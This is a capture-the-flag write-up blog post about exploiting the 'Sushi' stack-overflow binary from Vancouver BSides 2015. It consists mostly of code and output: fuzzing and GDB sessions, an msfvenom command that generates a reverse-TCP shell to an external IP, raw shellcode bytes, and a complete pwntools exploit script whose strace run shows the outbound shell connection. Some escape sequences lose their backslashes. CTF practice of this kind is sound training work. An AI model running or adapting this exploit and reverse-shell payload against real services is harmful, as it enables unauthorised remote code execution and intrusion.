---
id: 245
title: 'Vancouver BSides 2015 - Sushi Pwnable'
date: 2015-03-19T04:30:00+00:00
author: Kris
layout: post
guid: http://ctf.rip/?p=245
permalink: /vancouver-bsides-2015-sushi-pwnable/
post_views_count:
- "643"
categories:
- Uncategorized
- Write-Ups
tags:
- "2015"
---
Our first time doing Vancouver BSides which was an event said to be aimed at beginners and students. I was expecting a fun and medium challenge but I found it to be trickier than expected and where I knew the general direction of the solutions for a number of problems I didn't get enough time to focus on them during the middle of the week where it was held.

Anyway, following my goal of writing up one challenge from each CTF here is my write-up for Sushi - a Pwnable challenge for 100 points making it the simplest challenge in the Pwnable category by points ranking.

For this challenge the clue was only the challenge name and a hostname and port number with a binary to download:

```
sushi  
sushi.termsec.net 4000  
sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8  
```

Upon downloading the file we perform the usual few checks, discover it is a just a 64 bit ELF Linux executable which has been stripped.

```
root@mankrik:~/bsides/origfiles# file sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8   
sushi-a6cbcb6858835fbc6d0b397d50541198cb4f98c8: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=0xded3f8ec9c4a27b93245abe4301f9a46924d5327, stripped  
```

Being the trusting type, I try to execute the program and am greeted with an input prompt asking me to deposit money for sushi?

```
root@mankrik:~/bsides# ./sushi  
Deposit money for sushi here: 0x7fff863241f0  
$1.00  
Sorry, $0.36 is not enough.  
```

Welp, that's a little interesting. An memory address and some kind of output. Being a simple level pwnable challenge, let's just quickly fuzz inputs to see if we can speedily come to a conclusion without too much disassembly. For this I use a bit of bash redirection from a python script.

```
#!/usr/bin/python  
import os  
for i in range(1,1000):  
    buf = 'A' * i  
    cmd = '/bin/sh -c "echo ' + buf + '" | ./sushi'  
    print str(i) + ":"  
    os.system(cmd)  
```

Which results in:

```
70:  
Deposit money for sushi here: 0x7fff2a5e6530  
Sorry, $0.65 is not enough.  
71:  
Deposit money for sushi here: 0x7fff34b64fc0  
Sorry, $0.65 is not enough.  
72:  
Deposit money for sushi here: 0x7ffff2602560  
Sorry, $0.65 is not enough.  
Segmentation fault  
73:  
Deposit money for sushi here: 0x7ffffeb7f050  
Sorry, $0.65 is not enough.  
Segmentation fault  
```

Nothing for the first 71 bytes but after that we have a crashing sushi program. Cool, so maybe its an overflow due to poor input validation? Sounds likely so let's check why it's crashing with GDB and a 72 byte long string:

```
root@mankrik:~/bsides# perl -e 'print "A" x 72; print "n"'  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
root@mankrik:~/bsides# gdb --quiet ./sushi  
Reading symbols from /root/bsides/sushi...(no debugging symbols found)...done.  
(gdb) r  
Starting program: /root/bsides/sushi   
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000  
Deposit money for sushi here: 0x7fffffffe250  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Sorry, $0.65 is not enough.  
Program received signal SIGSEGV, Segmentation fault.  
0x00007ffff7a70e03 in __libc_start_main () from /lib/x86_64-linux-gnu/libc.so.6  
(gdb) i r  
rax      0x0     0  
rbx      0x0     0  
rcx      0xffffffff     4294967295  
rdx      0x7ffff7dd8de0     140737351880160  
rsi      0x1     1  
rdi      0x1     1  
rbp      0x4141414141414141     0x4141414141414141  
rsp      0x7fffffffe2a0     0x7fffffffe2a0  
r8       0x10     16  
r9       0x1     1  
r10      0x4141414141414141     4702111234474983745  
r11      0x246     582  
r12      0x4004a0     4195488  
r13      0x7fffffffe370     140737488348016  
r14      0x0     0  
r15      0x0     0  
rip      0x7ffff7a70e03     0x7ffff7a70e03 <__libc_start_main+83>  
eflags     0x10202     [ IF RF ]  
cs       0x33     51  
ss       0x2b     43  
ds       0x0     0  
es       0x0     0  
fs       0x0     0  
gs       0x0     0  
(gdb)   
```

Ok so we can control the value of EBP with 72 bytes of A's. What about with more A's? An address is 6 bytes long in this context so I'll bump up the buffer size to 78 bytes.

```
(gdb) r  
The program being debugged has been started already.  
Start it from the beginning? (y or n) y  
Starting program: /root/bsides/sushi   
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000  
Deposit money for sushi here: 0x7fffffffe250  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Sorry, $0.65 is not enough.  
Program received signal SIGSEGV, Segmentation fault.  
0x0000414141414141 in ?? ()  
(gdb)   
```

Ok that's more like it. Direct control over EIP from 78 bytes of input. So now all we need to do is exploit this remotely and capture the flag. Easy!

First roadblock is, if you noticed from the results of the offset fuzzing python output about is that each time the sushi program starts the address it gives is different. ASLR does this and if it behaves this way on the remote system as it does on my local system then we need to deal with that in order to deliver a reliable exploit.

Fortunately our sushi engineers have been nice to just give us a perfectly valid stack location right in the greeting banner.

```
root@mankrik:~/bsides# gdb --quiet ./sushi  
Reading symbols from /root/bsides/sushi...(no debugging symbols found)...done.  
(gdb) r  
Starting program: /root/bsides/sushi   
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000  
Deposit money for sushi here: 0x7fffffffe250  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Sorry, $0.65 is not enough.  
Program received signal SIGSEGV, Segmentation fault.  
0x0000414141414141 in ?? ()  
(gdb) x/8bx 0x7fffffffe250  
0x7fffffffe250:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
(gdb)   
```

It even points directly to our input, so in order to start getting code executing we just need to parse this address and deliver it into the EIP location from there the OS will jump right into our buffer and begin executing some delicious shellcode.

Before we go too much further, let's get an environment setup which emulates the CTF environment. We can easily bind our sushi to a port using netcat. We can even wrap it with a while loop so it restarts after we crash it.

```
root@mankrik:~/bsides# while [ 1 ]; do nc -lvp 4000 -e ./sushi; done  
listening on [any] 4000 ...  
```

Then use netcat to test:

```
root@mankrik:~/bsides# nc localhost 4000   
Deposit money for sushi here: 0x7fff85649a20  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Sorry, $0.65 is not enough.  
root@mankrik:~/bsides#   
```

Which results in this neatness.

```
root@mankrik:~/bsides# while [ 1 ]; do nc -lvp 4000 -e ./sushi; done  
listening on [any] 4000 ...  
connect to [127.0.0.1] from localhost [127.0.0.1] 51068  
Segmentation fault  
listening on [any] 4000 ...  
```

OK so we have a working sushi server, knowledge about how to properly crash sushi and how to control EIP, we even know how to get a valid stack address and where to put that stack address in our payload in order to execute code.

In order to deliver all that I'm going to use pwntools / binjitsu which is a python framework used to make writing CTF exploits simpler.

Firstly lets build a script that just connects and parses the stack location and prepares that address for injection into our payload then sends the payload to see what happens...

```
#!/usr/bin/python  
from pwn import *  
buf = "A" * 72  
# open the tcp connection and receive the banner  
conn = remote('localhost', 4000)  
sushihello = conn.recvline()  
# parse the stack address from the sushi banner  
line = sushihello.split()  
addr = line[5].replace("0x","")  
# Reverse the byte order of the address  
little = "".join(reversed([addr[i:i+2] for i in range(0, len(addr), 2)]))  
# convert the addresses to binary  
data = little.decode('hex')  
# build payload  
attackstring = buf + data  
# display some debug information for ourselves  
print sushihello  
print "Address: 0x" + addr  
print "Length of attack: " + str(len(attackstring))  
# send the payload  
conn.send(attackstring)  
conn.close()  
```

Which results in this cool output thanks to binjitsu.

```
root@mankrik:~/bsides# ./suship1.py   
[+] Opening connection to localhost on port 4000: Done  
Deposit money for sushi here: 0x7fff16633800  
Address: 0x7fff16633800  
Length of attack: 78  
[*] Closed connection to localhost port 4000  
```

Let's add one thing just before it sends the payload "attackstring" so that we can have a few seconds to attach a debugger if we want:

```
...  
print "Length of attack: " + str(len(attackstring))   
# sleep so we can attach a debugger  
time.sleep(10)  
# send the payload   
conn.send(attackstring)   
...  
```

And to simplify attaching a debugger, without having to know the pid every time, use this Bash one-liner to fire up GDB on the sushi process:

```
root@mankrik:~/bsides# gdb --quiet -p `ps -auwwx | grep sushi | grep -v python | grep -v grep | awk '{print $2}'`  
```

So all that preperation done, let's run our exploit, attach our debugger and see where we're at:



```
root@mankrik:~/bsides# gdb --quiet -p `ps -auwwx | grep sushi | grep -v python | grep -v grep | awk '{print $2}'`  
warning: bad ps syntax, perhaps a bogus '-'?  
See http://gitorious.org/procps/procps/blobs/master/Documentation/FAQ  
Attaching to process 46889  
...
0x00007fbc9bd18970 in read () from /lib/x86_64-linux-gnu/libc.so.6  
(gdb) c  
Continuing.  
Program received signal SIGSEGV, Segmentation fault.  
0x00007fff06f4fe30 in ?? ()  
(gdb) x/4i $pc  
=> 0x7fff06f4fe30:     rex.B  
 0x7fff06f4fe31:     rex.B  
 0x7fff06f4fe32:     rex.B  
 0x7fff06f4fe33:     rex.B  
(gdb) x/4bx $pc  
0x7fff06f4fe30:     0x41     0x41     0x41     0x41  
```

Awesome! So we've exploited the process and our current crash is while trying to execute in our payload of "A"s which are the 0x41 bytes.

Time for shellcode, but before we go down that path let's consider what we're working with.

So far our buffer is only a measly 78 bytes long. Subtract 6 bytes for the EIP we need to inject that's 72 and we have to deduct a few more bytes from that to take into account any values our shellcode may need to push onto the stack in order to successfully execute. This leaves us with about 64 bytes give or take and there aren't that many options for shellcode that small that will operate remotely.

For my situation I decided I would go for a reverse TCP shell payload, keeping in mind the BSides event information and knowing that the challenges are in a chroot environment with only /bin/sh and /bin/cat really available. This seemed to be a good option.

So off to metasploit framework to generate our payload, I used msfvenom tool for this in Kali which I configured to send me a shell to my EC2 instance on port 80/tcp:

**Note**: You will not be able to directly use this shell code as it points directly to my EC2 instance. You'll need to use msfvenom to generate your own shellcode.

```
root@mankrik:~/bsides# msfvenom -f python -p linux/x64/shell_reverse_tcp LHOST=54.65.5.90 LPORT=80  
No platform was selected, choosing Msf::Module::Platform::Linux from the payload  
No Arch selected, selecting Arch: x86_64 from the payload  
No encoder or badchars specified, outputting raw payload  
buf = ""  
buf += "x6ax29x58x99x6ax02x5fx6ax01x5ex0fx05x48"  
buf += "x97x48xb9x02x00x00x50x36x41x05x5ax51x48"  
buf += "x89xe6x6ax10x5ax6ax2ax58x0fx05x6ax03x5e"  
buf += "x48xffxcex6ax21x58x0fx05x75xf6x6ax3bx58"  
buf += "x99x48xbbx2fx62x69x6ex2fx73x68x00x53x48"  
buf += "x89xe7x52x57x48x89xe6x0fx05"  
```

Argh! We have a problem. We only have 64 bytes or less available but my shellcode is 74 bytes. What to do? We need to spread out more. Hopefully we can figure this out by supplying a bigger buffer in our exploit.

Lets' add another buffer in our exploit and change the payload:

```
from pwn import *  
buf = "A" * 72  
after = "A" * 80  
# open the tcp connection and receive the banner  
...  
# build payload  
attackstring = buf + data + after  
# display some debug information for ourselves  
...  
```

Lets run the exploit and debug...

```
0x7fffc31fe000  
0x00007f9331cfd970 in read () from /lib/x86_64-linux-gnu/libc.so.6  
(gdb) c  
Continuing.  
Program received signal SIGSEGV, Segmentation fault.  
0x00000000004005f2 in ?? ()  
(gdb) x/4i $pc  
=> 0x4005f2:     retq    
 0x4005f3:     nopw  %cs:0x0(%rax,%rax,1)  
 0x4005fd:     nopl  (%rax)  
 0x400600:     push  %r15  
```

Hmm damn, seems we went backwards as we're not crashing in the right place anymore. Why?

Well through trial and error I found it to be due to the data stored on our stack after our injected EIP value. This is a 64 bit program but the address length we supplied was only 6 bytes. We need to pad the value with 2 null bytes before continuing our buffer with our arbitrary data.

Let's update our exploit and try again:

```
from pwn import *  
buf = "A" * 72  
after = "A" * 80  
nulls = "x00x00"
# open the tcp connection and receive the banner  
...  
# build payload  
attackstring = buf + data + nulls + after  
# display some debug information for ourselves  
...  
```

And the debug output confirms we're back to executing our code but this time with a tonne of space on the stack after our EIP value:

```
Program received signal SIGSEGV, Segmentation fault.  
0x00007fff4a9c8ea0 in ?? ()  
(gdb) x/4i $pc  
=> 0x7fff4a9c8ea0:     rex.B  
 0x7fff4a9c8ea1:     rex.B  
 0x7fff4a9c8ea2:     rex.B  
 0x7fff4a9c8ea3:     rex.B  
(gdb) x/160bx $pc  
0x7fff4a9c8ea0:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
0x7fff4a9c8ea8:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
0x7fff4a9c8eb0:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
0x7fff4a9c8eb8:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
0x7fff4a9c8ec0:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
0x7fff4a9c8ec8:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
0x7fff4a9c8ed0:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
0x7fff4a9c8ed8:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
0x7fff4a9c8ee0:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
0x7fff4a9c8ee8:     0xa0     0x8e     0x9c     0x4a     0xff     0x7f     0x00     0x00  
0x7fff4a9c8ef0:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
0x7fff4a9c8ef8:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
0x7fff4a9c8f00:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
0x7fff4a9c8f08:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
0x7fff4a9c8f10:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
0x7fff4a9c8f18:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
0x7fff4a9c8f20:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
0x7fff4a9c8f28:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
0x7fff4a9c8f30:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
0x7fff4a9c8f38:     0x41     0x41     0x41     0x41     0x41     0x41     0x41     0x41  
```

So whats next though, we could do the next step in two ways. Instead of specifying the EIP we are now, we could add 78 to it so it would jump forward, or we could insert a jmp instruction at the current EIP value and tell it to do the jump into our second, larger buffer.

Let's do the latter because it sounds more fun. First lets get the opcodes for jmp +80bytes. We can do this with the nasm_shell tool from metasploit framework:

```
root@mankrik:~/bsides# /usr/share/metasploit-framework/tools/nasm_shell.rb  
nasm > jmp 80  
00000000 E94B000000    jmp dword 0x50  
```

Ok so in python format thats jmp = "xe9x4bx00x00x00", lets add it to our exploit and subtract the number of bytes from our buffer so we keep everything in order.

Let's also replace our "after" buffer with real live shellcode. So our full exploit now looks like this:

```
#!/usr/bin/python   
from pwn import *   
jmp = "xe9x4bx00x00x00"  
buf = "A" * (72 - len(jmp))   
shellcode = ""   
shellcode += "x6ax29x58x99x6ax02x5fx6ax01x5ex0fx05x48"   
shellcode += "x97x48xb9x02x00x00x50x36x41x05x5ax51x48"   
shellcode += "x89xe6x6ax10x5ax6ax2ax58x0fx05x6ax03x5e"   
shellcode += "x48xffxcex6ax21x58x0fx05x75xf6x6ax3bx58"   
shellcode += "x99x48xbbx2fx62x69x6ex2fx73x68x00x53x48"   
shellcode += "x89xe7x52x57x48x89xe6x0fx05"   
nulls = "x00x00"  
# open the tcp connection and receive the banner   
conn = remote('localhost', 4000)   
sushihello = conn.recvline()   
# parse the stack address from the sushi banner   
line = sushihello.split()   
addr = line[5].replace("0x","")   
# Reverse the byte order of the address   
little = "".join(reversed([addr[i:i+2] for i in range(0, len(addr), 2)]))   
# convert the addresses to binary   
data = little.decode('hex')   
# build payload   
attackstring = jmp + buf + data + nulls + shellcode  
# display some debug information for ourselves   
print sushihello   
print "Address: 0x" + addr   
print "Length of attack: " + str(len(attackstring))   
# send the payload   
conn.send(attackstring)   
conn.close()   
```

Great - we should be all set. This time, instead of using GDB to debug the sushi program, let's use strace to trace what's going on. The command line syntax is the same as GDB (e.g. strace -p <pid>)

```
root@mankrik:~/bsides# strace -p `ps -auwwx | grep sushi | grep -v python | grep -v grep | awk '{print $2}'`  
warning: bad ps syntax, perhaps a bogus '-'?  
See http://gitorious.org/procps/procps/blobs/master/Documentation/FAQ  
Process 52194 attached - interrupt to quit  
read(0, "", 4096)            = 0  
write(1, "Sorry, $0.-23 is not enough.n", 29) = 29  
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3  
connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("54.65.5.90")}, 16^C <unfinished ...>  
Process 52194 detached  
root@mankrik:~/bsides#   
```

Woot! Our shell code is trying to make the outbound reverse shell connection!

The only thing left to do here is to change the exploit to point at the sushi server in the live production instance and exploit it. Once the shell is achieved we simply use "cat flag.txt" and receive the flag.

A fun challenge for me this one as I had been waiting for an opportunity to practice remote overflow writing and also this was the first time I got my feet wet with binjitsu.

Write up by Dacat